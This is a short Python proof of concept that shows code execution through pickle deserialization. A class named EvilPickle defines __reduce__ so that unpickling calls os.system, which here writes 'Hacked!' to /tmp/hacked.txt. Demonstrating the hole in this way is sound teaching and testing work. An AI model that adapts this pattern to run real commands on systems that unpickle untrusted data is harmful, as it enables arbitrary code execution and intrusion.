import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "Hacked!" > /tmp/hacked.txt',))

data = pickle.dumps(EvilPickle())
pickle.loads(data)
